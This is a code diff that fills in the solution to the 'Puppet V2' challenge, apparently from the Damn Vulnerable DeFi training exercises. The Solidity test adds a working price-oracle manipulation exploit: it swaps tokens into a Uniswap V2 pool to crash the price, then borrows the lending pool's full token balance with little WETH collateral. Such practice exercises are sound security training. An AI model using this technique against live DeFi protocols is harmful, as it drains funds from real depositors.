@@ -91,14 +91,26 @@ contract PuppetV2Challenge is Test {
 
         // Check pool's been correctly setup
         assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
-        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
+        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        uint256 currentDVTBalance = token.balanceOf(player);
+
+        token.approve(address(uniswapV2Router), currentDVTBalance);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokens(currentDVTBalance, 1, path, address(player), block.timestamp);
+
+        weth.deposit{value: player.balance}();
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
